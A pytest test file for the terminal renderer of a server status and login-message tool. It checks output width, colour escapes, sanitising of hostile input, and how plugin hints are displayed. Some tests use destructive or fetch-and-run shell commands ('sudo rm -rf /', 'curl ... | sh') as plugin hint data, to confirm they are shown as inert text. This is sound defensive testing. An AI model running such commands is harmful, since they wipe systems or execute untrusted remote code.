"""Renderer: golden files, width contract, colour rules, hostile input (blueprint 4.6, phase 4).

Golden files live in ``tests/golden``; escape bytes are written as ``\\e`` there so the
files stay plain text. Set ``MOTP_UPDATE_GOLDEN=1`` to rewrite them after a deliberate
change of the look, and review the diff.
"""

import os
import re
import unicodedata
from dataclasses import replace
from pathlib import Path

import pytest

from motp import render as renderer
from motp.core.cache import Layout
from motp.core.model import (
    Detail,
    HintRef,
    Item,
    LiteralText,
    MessageRef,
    ModuleResult,
    Status,
    Unit,
    Visibility,
)
from motp.core.sanitize import cell_width
from motp.render import demo, figfont, layout, view
from motp.render.theme import (
    ASCII,
    UNICODE,
    ColorLevel,
    Theme,
    escape_sequences,
    themed,
)

from .test_sanitize import HOSTILE

GOLDEN = Path(__file__).resolve().parent / "golden"
WIDTHS = (80, 70, 50, 30)
CHARSETS = {"unicode": UNICODE, "ascii": ASCII}
COLORS = {"color": ColorLevel.BASIC, "plain": ColorLevel.OFF}
ESCAPE = re.compile(r"\x1b\[[0-9;]*m")
FRAME_EDGES = set("|+│├┤┌┐└┘")


def visible(text: str) -> str:
    return ESCAPE.sub("", text)


def demo_text(width: int, charset: str, color: str, **kwargs: object) -> str:
    inp = demo.demo_input(**kwargs)  # type: ignore[arg-type]
    theme = themed(CHARSETS[charset], COLORS[color], inp.look)
    return renderer.render(inp, width, theme)


def check_golden(name: str, text: str) -> None:
    path = GOLDEN / name
    text = text.replace("\x1b", "\\e")
    if os.environ.get("MOTP_UPDATE_GOLDEN") == "1":
        path.write_bytes(text.encode("utf-8"))
    assert path.read_bytes().decode("utf-8") == text


# --- golden files ------------------------------------------------------------------------


@pytest.mark.parametrize("color", sorted(COLORS))
@pytest.mark.parametrize("charset", sorted(CHARSETS))
@pytest.mark.parametrize("width", WIDTHS)
def test_golden(width: int, charset: str, color: str) -> None:
    check_golden(f"demo-{width}-{charset}-{color}.txt", demo_text(width, charset, color))


@pytest.mark.parametrize("color", sorted(COLORS))
@pytest.mark.parametrize("charset", sorted(CHARSETS))
@pytest.mark.parametrize("width", (80, 50))
def test_golden_classic(width: int, charset: str, color: str) -> None:
    text = demo_text(width, charset, color, preset="classic")
    check_golden(f"classic-{width}-{charset}-{color}.txt", text)


@pytest.mark.parametrize("preset", ["default", "classic"])
def test_golden_256_colours(preset: str) -> None:
    inp = demo.demo_input(preset=preset)
    text = renderer.render(inp, 80, themed(UNICODE, ColorLevel.EXTENDED, inp.look))
    name = "demo-80-unicode-256.txt" if preset == "default" else "classic-80-unicode-256.txt"
    check_golden(name, text)


def test_demo_covers_every_status_and_section() -> None:
    v = view.build(demo.demo_input())
    names = [s.name for s in v.sections]
    assert names == list(Layout().sections)
    statuses = {r.status for s in v.sections for r in s.rows}
    assert {Status.OK, Status.WARN, Status.CRIT, Status.UNKNOWN} <= statuses
    assert any(r.note for s in v.sections for r in s.rows), "a stale value"
    alerts = v.sections[0].alerts
    assert sum(1 for a in alerts if a.command) >= 3
    assert any(a.prefix and a.hint and not a.command for a in alerts)
    assert any(r.bar is not None and r.bar >= 0.9 for s in v.sections for r in s.rows)
    assert any(r.prefix for s in v.sections for r in s.rows)


# --- width contract -----------------------------------------------------------------------


@pytest.mark.parametrize("charset", sorted(CHARSETS))
@pytest.mark.parametrize("width", range(10, 131))
def test_no_line_is_wider_than_the_width(width: int, charset: str) -> None:
    for line in demo_text(width, charset, "color").splitlines():
        assert cell_width(visible(line)) <= width, (width, line)


@pytest.mark.parametrize("width", [79, 80, 120, 200])
def test_framed_lines_have_the_frame_width(width: int) -> None:
    lines = demo_text(width, "unicode", "plain").splitlines()
    frame = min(width, layout.MAX_FRAME)
    for line in lines:
        assert cell_width(line) == frame, line
        assert line[0] in FRAME_EDGES and line[-1] in FRAME_EDGES


@pytest.mark.parametrize("width", [80, 120])
def test_a_long_hostname_drops_the_header_and_never_overflows(width: int) -> None:
    host = "a" * 18 + "-" + "b" * 20 + "9"  # 40 characters, one label
    assert len(host) == 40
    text = demo_text(width, "unicode", "plain", hostname=host)
    lines = text.splitlines()
    assert "Attention" in lines[0], "the first section title sits in the top frame line"
    for line in lines:
        assert cell_width(line) <= width
    short = demo_text(width, "unicode", "plain").splitlines()
    assert "Attention" not in short[0], "a short host name gets a header"


def test_a_medium_hostname_falls_back_to_the_small_font() -> None:
    lines = demo_text(80, "ascii", "plain", hostname="build-server-12.example.com").splitlines()
    header = []
    for line in lines[1:]:
        if line.startswith("+"):
            break
        header.append(line[3:-1].rstrip())
    small = figfont.bundled("small")
    assert small is not None
    drawn = [row for row in figfont.render(small, "BUILD-SERVER-12") if row.strip()]
    assert header == drawn, "the small font, blank rows left out"


def test_width_classes() -> None:
    assert [layout.width_class(w) for w in (200, 80, 79, 60, 59, 40, 39, 10)] == [
        "wide", "wide", "compact", "compact", "plain", "plain", "minimal", "minimal",
    ]  # fmt: skip


def test_minimal_without_alerts_shows_host_and_uptime() -> None:
    inp = demo.demo_input()
    calm = replace(
        inp,
        failed=0,
        sources=tuple(
            s for s in inp.sources if s.module in ("os_uptime", "os_host", "net_addresses")
        ),
    )
    text = renderer.render(calm, 30, Theme(ASCII, ColorLevel.OFF))
    assert text == "web01, up 41 days 3 hours\n"


# --- colour ---------------------------------------------------------------------------------


@pytest.mark.parametrize("width", WIDTHS)
@pytest.mark.parametrize("charset", sorted(CHARSETS))
def test_without_colour_there_is_no_escape_byte(width: int, charset: str) -> None:
    text = demo_text(width, charset, "plain")
    assert "\x1b" not in text
    assert "[!!]" in text and "[!]" in text


def test_colour_output_uses_only_theme_sequences() -> None:
    text = demo_text(80, "unicode", "color")
    for seq in escape_sequences():
        text = text.replace(seq, "")
    assert "\x1b" not in text


def test_ascii_output_is_ascii() -> None:
    for width in WIDTHS:
        assert demo_text(width, "ascii", "color").isascii()


# --- hostile strings -------------------------------------------------------------------------


def _hostile_sources(raw: str) -> tuple[view.Source, ...]:
    """The demo with ``raw`` in every place collected text can reach."""

    def item(i: Item) -> Item:
        return replace(
            i,
            value=raw if type(i.value) is str else i.value,
            label=LiteralText(raw) if isinstance(i.label, LiteralText) else i.label,
            text=LiteralText(raw) if isinstance(i.text, LiteralText) else i.text,
            hint=LiteralText(raw) if isinstance(i.hint, LiteralText) else i.hint,
            origin=raw if i.origin else None,
            detail=tuple(replace(d, value=raw) for d in i.detail),
        )

    out = []
    for s in demo.sources(raw):
        result = replace(s.result, items=tuple(item(i) for i in s.result.items))
        out.append(replace(s, result=result))
    hostile = Item(
        "plugin.x.y",
        raw,
        label=LiteralText(raw),
        status=Status.CRIT,
        text=LiteralText(raw),
        hint=LiteralText(raw),
        origin=raw,
    )
    out.append(view.Source("x", "plugins", ModuleResult(demo.NOW, 300, 86400, (hostile,))))
    return tuple(out)


@pytest.mark.parametrize("raw", HOSTILE)
def test_hostile_strings_render_inert(raw: str) -> None:
    inp = replace(demo.demo_input(raw), sources=_hostile_sources(raw), hostname=raw)
    for width in (*WIDTHS, 120):
        for charset in CHARSETS.values():
            text = renderer.render(inp, width, Theme(charset, ColorLevel.OFF))
            assert not re.search(r"[\x00-\x09\x0b-\x1f\x7f-\x9f]", text), repr(text[:200])
            assert not re.search(r"[​-‏‪-‮⁦-⁩]", text)
            lines = text.splitlines()
            for line in lines:
                assert cell_width(line) <= width
            if width >= layout.COMPACT:
                frame = min(width, layout.MAX_FRAME)
                for line in lines:
                    assert cell_width(line) == frame and line[0] in FRAME_EDGES, line
                    assert line[-1] in FRAME_EDGES, line
                # Box characters appear only at the edges of a line and in frame lines.
                inner = [ln[1:-1] for ln in lines if ln[1] in " "]
                assert not any(set(ln) & set("─│├┤") for ln in inner)
            colored = renderer.render(inp, width, Theme(charset, ColorLevel.EXTENDED))
            for seq in escape_sequences():
                colored = colored.replace(seq, "")
            assert "\x1b" not in colored and "\x9b" not in colored


# --- view details ----------------------------------------------------------------------------


def _one(item: Item, *, age: int = 0, **kwargs: object) -> view.View:
    source = view.Source("m", "system", ModuleResult(demo.NOW - age, 60, 600, (item,)))
    inp = view.RenderInput(sources=(source,), now=demo.NOW, hostname="h", **kwargs)  # type: ignore[arg-type]
    return view.build(inp)


def test_expired_items_become_unknown_and_stale_items_carry_their_age() -> None:
    item = Item("m.x", 5, Unit.COUNT, label=LiteralText("X"), status=Status.CRIT)
    stale = _one(item, age=200).sections
    assert stale[-1].rows[0].note == "(3 minutes 20 seconds old)"
    expired = _one(item, age=601).sections
    assert [s.name for s in expired] == ["system"], "no alert for an expired item"
    assert expired[0].rows[0].value == "unknown" and expired[0].rows[0].muted
    assert expired[0].rows[0].note == "", "no age note on an expired row (code review, 14b)"


def test_admin_items_and_details_need_the_admin_view() -> None:
    item = Item(
        "m.x",
        1,
        label=LiteralText("X"),
        visibility=Visibility.ADMIN,
        detail=(Detail("m.d", "secret"),),
    )
    assert _one(item).sections == ()
    rows = _one(item, admin=True).sections[0].rows
    assert [r.value for r in rows] == ["1", "secret"]


def test_hint_commands_follow_the_package_manager() -> None:
    item = Item("m.x", 3, status=Status.WARN, hint=HintRef("updates.security"))
    apt = _one(item, package_manager="apt").sections[0].alerts[0]
    dnf = _one(item, package_manager="dnf").sections[0].alerts[0]
    other = _one(item, package_manager="").sections[0].alerts[0]
    assert (apt.command, dnf.command, other.command) == (
        "sudo apt upgrade",
        "sudo dnf upgrade --security",
        None,
    )
    assert other.hint == "Install the pending security updates"


def test_plugin_hints_are_text_never_commands() -> None:
    item = Item(
        "plugin.p.x",
        status=Status.CRIT,
        text=LiteralText("bad"),
        hint=LiteralText("sudo rm -rf /"),
        origin="10-p",
    )
    alert = _one(item).sections[0].alerts[0]
    assert alert.command is None and alert.hint == "Plugin hint: sudo rm -rf /"
    assert alert.prefix == "[plugin 10-p]"
    text = renderer.render(_input(item), 80, Theme(ASCII, ColorLevel.BASIC))
    assert "\x1b[36msudo rm" not in text, "never painted as a command"


def _input(item: Item) -> view.RenderInput:
    source = view.Source("p", "plugins", ModuleResult(demo.NOW, 60, 600, (item,)))
    return view.RenderInput(sources=(source,), now=demo.NOW, hostname="h")


def test_alerts_are_ordered_critical_first_then_by_section() -> None:
    titles = [a.text for a in view.build(demo.demo_input()).sections[0].alerts]
    assert titles[:3] == [
        "Firewall is not active",
        "/: 96% of 40 GiB, 1.6 GiB free",  # a meter names its mount
        "1 failed unit",
    ]
    assert titles[-1] == "1 module failed, run `motp doctor`"


def test_old_cache_notice() -> None:
    inp = replace(demo.demo_input(), cache_age=4000, failed=0)
    alert = view.build(inp).sections[0].alerts[-1]
    assert alert.text == "The collected data is 1 hour 6 minutes old"
    assert alert.command == "systemctl status motp-collect.timer"


def test_value_formats() -> None:
    from motp.core.i18n import translator

    tr = translator("en")
    fmt = view.format_value
    assert fmt(tr, 6335076761, Unit.BYTES, 0) == "5.9 GiB"
    assert fmt(tr, 512, Unit.BYTES, 0) == "512 B"
    assert fmt(tr, 3553200, Unit.SECONDS, 0) == "41 days 3 hours"
    assert fmt(tr, 1, Unit.SECONDS, 0) == "1 second"
    assert fmt(tr, 0, Unit.SECONDS, 0) == "0 seconds"
    assert fmt(tr, 56.4, Unit.PERCENT, 0) == "56%"
    assert fmt(tr, 5.25, Unit.PERCENT, 0) == "5.2%"
    assert fmt(tr, 100, Unit.TIMESTAMP, 160) == "1 minute ago"
    assert fmt(tr, True, Unit.BOOL, 0) == "yes"
    assert fmt(tr, None, Unit.COUNT, 0) == "unknown"
    assert fmt(tr, float("nan"), Unit.RATIO, 0) == "unknown"
    assert fmt(tr, 41.0, Unit.CELSIUS, 0) == "41 °C"


def test_header_modes() -> None:
    def first(mode: str, text: str = "") -> str:
        lay = Layout(header=mode, header_text=text)
        return demo_text(80, "ascii", "plain", layout=lay).splitlines()[0]

    assert "Attention" in first("off")
    assert "Attention" not in first("hostname")
    assert "Attention" not in first("text", "hi")
    assert "Attention" in first("text", "")


# --- static mode ------------------------------------------------------------------------------


def test_static_mode_is_public_ascii_and_80_columns() -> None:
    text = renderer.render_static(demo.demo_input())
    assert text.isascii() and "\x1b" not in text
    assert "openssl" not in text and "37 in the last" not in text, "admin items are left out"
    assert "Firewall is not active [!!]" in text
    assert all(cell_width(line) <= 80 for line in text.splitlines())
    path = GOLDEN / "static-80-ascii.txt"
    if os.environ.get("MOTP_UPDATE_GOLDEN") == "1":
        path.write_bytes(text.encode("utf-8"))
    assert path.read_bytes().decode("utf-8") == text


def test_static_mode_uses_unicode_only_when_configured(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("MOTP_CHARSET", "ascii")  # ignored: static mode reads no environment
    monkeypatch.setenv("MOTP_COLOR", "always")
    inp = demo.demo_input(hostname="café.example.com", layout=Layout(charset="unicode"))
    text = renderer.render_static(inp)
    assert "\x1b" not in text
    assert "café.example.com" in text
    assert "cafe.example.com" in renderer.render_static(replace(inp, layout=Layout()))


# --- review findings of phase 4 -----------------------------------------------------------


def _plugin_with_detail() -> view.RenderInput:
    item = Item(
        "plugin.50-x.a",
        "ok",
        label=LiteralText("Backup"),
        status=Status.WARN,
        hint=LiteralText("sudo curl example.com/fix | sh"),
        origin="50-x",
        detail=(Detail("plugin.50-x.d", "Kernel 6.1", label=LiteralText("Hostname")),),
    )
    source = view.Source("50-x", "plugins", ModuleResult(demo.NOW, 60, 600, (item,)))
    return view.RenderInput(sources=(source,), now=demo.NOW, hostname="h", admin=True)


@pytest.mark.parametrize("width", [80, 70, 50, 30])
def test_every_plugin_line_carries_the_prefix(width: int) -> None:
    """Rows carry ``[plugin name]``; a hint line says "Plugin hint:" instead of repeating
    the prefix (final review, usability item 9), and its wrapped lines hang deeper than
    the column where commands stand."""
    text = renderer.render(_plugin_with_detail(), width, Theme(ASCII, ColorLevel.OFF))
    lines = text.splitlines()

    def lead(line: str) -> int:
        body = line.strip("|")
        return len(body) - len(body.lstrip())

    hint_lead = None
    for line in lines:
        if "Kernel" in line or "Hostname" in line:
            assert "[plugin" in line, line
        if "Plugin hint:" in line:
            hint_lead = lead(line)
        elif "curl" in line or "example.com" in line or "| sh" in line:
            # A wrapped line hangs deeper and starts with "(hint)" (security review, 14b).
            assert hint_lead is not None and lead(line) > hint_lead, line
            assert line.strip("| ").startswith("(hint) "), line


def test_plugin_hint_never_looks_like_a_table_command() -> None:
    item = Item("m.x", 3, status=Status.WARN, hint=HintRef("updates.security"))
    inp = replace(_plugin_with_detail(), package_manager="apt")
    inp = replace(
        inp,
        sources=(
            *inp.sources,
            view.Source("m", "system", ModuleResult(demo.NOW, 60, 600, (item,))),
        ),
    )
    for width in (50, 30):
        lines = renderer.render(inp, width, Theme(ASCII, ColorLevel.OFF)).splitlines()
        assert any(ln.strip() == "sudo apt upgrade" for ln in lines)
        command_column = next(len(ln) - len(ln.lstrip()) for ln in lines if "sudo apt" in ln)
        for line in lines:
            if "curl" in line or "| sh" in line:
                assert "Plugin hint:" in line or len(line) - len(line.lstrip()) > command_column


def test_a_plugin_item_with_a_hint_id_gets_no_command() -> None:
    item = Item("plugin.p.x", 1, status=Status.CRIT, hint=HintRef("reboot.required"), origin="p")
    alert = _one(item, package_manager="apt").sections[0].alerts[0]
    assert alert.command is None and alert.hint == ""


def test_expired_items_hide_their_details_and_stale_details_carry_the_age() -> None:
    item = Item("m.x", 5, label=LiteralText("X"), detail=(Detail("m.d", "old-value"),))
    expired = _one(item, age=601, admin=True).sections[0].rows
    assert [r.value for r in expired] == ["unknown"]
    stale = _one(item, age=200, admin=True).sections[0].rows
    assert stale[1].value == "old-value" and stale[1].note == stale[0].note != ""


@pytest.mark.parametrize("width", [0, 1, 5, 9])
def test_too_narrow_terminals_get_nothing(width: int) -> None:
    assert demo_text(width, "unicode", "color") == ""
    assert layout.plain(view.build(demo.demo_input()), width, Theme(ASCII, ColorLevel.OFF)) == []


@pytest.mark.parametrize("width", (80, 70))
@pytest.mark.parametrize("charset", sorted(CHARSETS))
def test_a_command_moves_down_rather_than_cut_its_alert(width: int, charset: str) -> None:
    text = "Automatic updates are not installed"
    command = "sudo systemctl enable --now dnf-automatic-install.timer"
    shown = view.View("", "", (view.Section("attention", "Attention", alerts=(
        view.Alert(text=text, status=Status.WARN, command=command),)),))  # fmt: skip
    lines = layout.render(shown, width, themed(CHARSETS[charset], ColorLevel.OFF))
    assert any(f"{text} [!]" in line for line in lines), lines
    assert any(command in line and text not in line for line in lines), lines


def test_a_short_command_stays_beside_its_alert() -> None:
    alert = view.Alert(text="Reboot required", status=Status.WARN, command="sudo reboot")
    shown = view.View("", "", (view.Section("attention", "Attention", alerts=(alert,)),))
    lines = layout.render(shown, 80, themed(ASCII, ColorLevel.OFF))
    assert any("Reboot required" in line and "sudo reboot" in line for line in lines)


# --- right-to-left letters in collected names (final review, security item 3) -----------

RTL_HOST = "אבג 192.0.2.1"


def test_collected_names_lose_right_to_left_letters() -> None:
    item = Item(
        "os_sessions.list",
        RTL_HOST,
        label=MessageRef("label.jail", (("jail", "ال sshd"),)),
        detail=(Detail("m.d", "١٢ tty1", label=MessageRef("label.jail", (("jail", "x"),))),),
        visibility=Visibility.PUBLIC,
    )
    rows = _one(item, admin=True).sections[0].rows
    text = " ".join(f"{r.label} {r.value}" for r in rows)
    assert "192.0.2.1" in text and "tty1" in text and "sshd" in text
    assert not any(unicodedata.bidirectional(c) in ("R", "AL", "AN") for c in text), text
    inp = view.RenderInput(sources=(), now=demo.NOW, hostname="אhost")
    assert "א" not in renderer.render(inp, 80, Theme(UNICODE, ColorLevel.OFF))


def test_config_row_labels_keep_right_to_left_letters() -> None:
    """Code review of phase 14b: an admin's [[rows.unit]] label is not a collected name."""
    hebrew = "\u05e9\u05e8\u05ea web"
    for msg_id, key in (("label.unit_row", "rows_unit.x"), ("label.file_row", "rows_file_age.x")):
        item = Item(key, "active", label=MessageRef(msg_id, (("label", hebrew),)))
        assert _one(item).sections[0].rows[0].label == hebrew


def test_plugin_text_keeps_right_to_left_letters() -> None:
    hebrew = "שלום"
    item = Item("plugin.p.x", hebrew, label=LiteralText(hebrew), text=None, origin="10-p")
    rows = _one(item, admin=True).sections[0].rows
    assert rows[0].value == hebrew and rows[0].label == hebrew


def test_ignored_config_files_are_an_admin_alert_with_the_check_command() -> None:
    """Final review, usability item 6; public readers never see it."""
    inp = view.RenderInput(sources=(), now=demo.NOW, hostname="h", config_ignored=1, admin=True)
    alerts = view.build(inp).sections[0].alerts
    assert [(a.text, a.command) for a in alerts] == [
        ("Config: 1 file ignored", "sudo motp config check")
    ]
    public = replace(inp, admin=False)
    assert all(s.name != "attention" for s in view.build(public).sections)


# --- final review, usability items 8 and 9 -------------------------------------------------


def test_a_cut_label_never_looks_like_the_dotted_leader() -> None:
    theme = Theme(ASCII, ColorLevel.OFF)
    assert layout.cut_label(theme, "Operating system", 10) == "Operating~"
    assert layout.cut_label(theme, "Kernel", 10) == "Kernel"


@pytest.mark.parametrize("language", ["en", "de"])
@pytest.mark.parametrize("width", [60, 70, 80])
def test_the_label_column_grows_so_the_demo_labels_are_not_cut(language: str, width: int) -> None:
    text = renderer.render(demo.demo_input(language=language), width, Theme(ASCII, ColorLevel.OFF))
    labels = [ln.split(":")[0] for ln in text.splitlines() if ln.startswith("|  ") and ":" in ln]
    if language == "en":
        assert not [label for label in labels if label.endswith("~")], labels
        assert "Operating system" in text and "Login from" in text


def test_a_command_is_shown_whole_or_not_at_all() -> None:
    item = Item("m.x", 3, status=Status.WARN, hint=HintRef("updates.security"), text=None)
    for width in (60, 45, 30, 20, 12):
        inp = replace(_input(item), package_manager="dnf")
        lines = renderer.render(inp, width, Theme(ASCII, ColorLevel.OFF)).splitlines()
        shown = [ln for ln in lines if "sudo dnf" in ln]
        assert all("sudo dnf upgrade --security" in ln for ln in shown), (width, lines)


def test_a_long_hint_wraps_instead_of_being_cut() -> None:
    hint = "Check the backup job on the storage server and look at its log"
    item = Item(
        "plugin.p.x",
        status=Status.WARN,
        text=LiteralText("late"),
        hint=LiteralText(hint),
        origin="p",
    )
    for width in (60, 45, 30):
        text = renderer.render(_input(item), width, Theme(ASCII, ColorLevel.OFF))
        words = " ".join(
            ln.strip("| ").replace("Plugin hint: ", "").replace("(hint) ", "")
            for ln in text.splitlines()
            if "Plugin hint:" in ln or ln.startswith(("        ", "|          "))
        )
        assert " ".join(words.split()).endswith("look at its log"), (width, text)
        assert "..." not in "".join(ln for ln in text.splitlines() if "hint" in ln)


# --- phase 14c: plugin rows wrap instead of being cut ---------------------------------------

PLUGIN_LEADS = ("[plugin ", "(plugin) ", "Plugin hint: ", "(hint) ")
PLUGIN_LEADS_DE = ("[Plugin ", "(Plugin) ", "Hinweis des Plugins: ", "(Hinweis) ")


def _content(line: str) -> str:
    """A line without colour, frame edges and the blank cells beside them; "" for a frame
    line without a title."""
    text = visible(line).strip().strip("|│").strip()
    return "" if set(text) <= set("+-─┌┐└┘├┤") else text


def _section(text: str, title: str, after: str) -> list[str]:
    """The content lines of the section ``title`` up to the next one starting ``after``."""
    lines = [_content(ln) for ln in text.splitlines()]
    start = next(n for n, ln in enumerate(lines) if title in ln)
    end = next((n for n in range(start + 1, len(lines)) if after in lines[n]), len(lines))
    return [ln for ln in lines[start + 1 : end] if ln]


@pytest.mark.parametrize("color", sorted(COLORS))
@pytest.mark.parametrize("charset", sorted(CHARSETS))
def test_the_demo_plugin_row_wraps_at_60_columns(charset: str, color: str) -> None:
    text = demo_text(60, charset, color)
    assert _section(text, "Plugins", "\0") == [
        "[plugin 50-backup-status] Backup: last run 30",
        "(plugin) hours ago [!]",
    ]
    assert not any("..." in ln or "…" in ln for ln in text.splitlines() if "plugin" in ln)


@pytest.mark.parametrize("color", sorted(COLORS))
@pytest.mark.parametrize("charset", sorted(CHARSETS))
def test_the_demo_plugin_row_and_alert_wrap_at_45_columns(charset: str, color: str) -> None:
    text = demo_text(45, charset, color)
    attention = _section(text, "Attention", "Host")
    start = next(n for n, ln in enumerate(attention) if ln.startswith("[plugin"))
    assert attention[start : start + 4] == [
        "[plugin 50-backup-status] last run 30",
        "(plugin) hours ago [!]",
        "Plugin hint: Check the backup job on",
        "(hint) the storage server",
    ]
    assert _section(text, "Plugins", "\0") == [
        "[plugin 50-backup-status] Backup: last run",
        "(plugin) 30 hours ago [!]",
    ]
    for line in text.splitlines():
        assert cell_width(visible(line)) <= 45, line


@pytest.mark.parametrize("charset", sorted(CHARSETS))
def test_a_wrapped_plugin_hint_leaves_no_word_alone(charset: str) -> None:
    attention = _section(demo_text(60, charset, "plain"), "Attention", "Host")
    assert "Plugin hint: Check the backup job on the" in attention
    assert "(hint) storage server" in attention
    assert "(hint) server" not in attention


@pytest.mark.parametrize("width", [80, 70, 60, 45])
def test_a_plugin_row_that_fits_is_not_wrapped(width: int) -> None:
    item = Item(
        "plugin.p.x", "late", label=LiteralText("Backup"), status=Status.WARN, origin="10-p"
    )
    text = renderer.render(_input(item), width, Theme(ASCII, ColorLevel.OFF))
    plugin = [ln for ln in map(_content, text.splitlines()) if "plugin" in ln]
    assert plugin[-1] == "[plugin 10-p] Backup: late [!]", text
    assert not any("(plugin)" in ln for ln in plugin)


def _hostile_plugin(language: str) -> view.RenderInput:
    words = " ".join(f"zq{n}" for n in range(1, 40))
    item = Item(
        "plugin.50-x.a",
        words,
        label=LiteralText("Hostname"),
        status=Status.CRIT,
        hint=LiteralText(words),
        origin="50-x",
    )
    source = view.Source("50-x", "plugins", ModuleResult(demo.NOW, 60, 600, (item,)))
    return view.RenderInput(
        sources=(source,), now=demo.NOW, hostname="h", admin=True, language=language
    )


@pytest.mark.parametrize("language", ["en", "de"])
@pytest.mark.parametrize("charset", sorted(CHARSETS))
@pytest.mark.parametrize("color", sorted(COLORS))
def test_every_line_of_plugin_text_starts_with_a_plugin_marker(
    language: str, charset: str, color: str
) -> None:
    """A plugin cannot make a wrapped piece of its text stand at the start of a line, where
    it could pass for a system row (T7): the renderer starts each such line with a marker
    from the catalogue. And no line is wider than the terminal."""
    inp = _hostile_plugin(language)
    leads = PLUGIN_LEADS if language == "en" else PLUGIN_LEADS_DE
    theme = themed(CHARSETS[charset], COLORS[color], inp.look)
    for width in range(10, 131):
        for line in renderer.render(inp, width, theme).splitlines():
            assert cell_width(visible(line)) <= width, (width, line)
            content = _content(line)
            if "zq" in content:
                assert content.startswith(leads), (width, line)


@pytest.mark.parametrize("language", ["en", "de"])
@pytest.mark.parametrize("charset", sorted(CHARSETS))
def test_no_demo_line_is_wider_than_the_width_in_either_language(
    language: str, charset: str
) -> None:
    inp = demo.demo_input(language=language)
    for color in COLORS.values():
        theme = themed(CHARSETS[charset], color, inp.look)
        for width in range(10, 131):
            for line in renderer.render(inp, width, theme).splitlines():
                assert cell_width(visible(line)) <= width, (width, line)
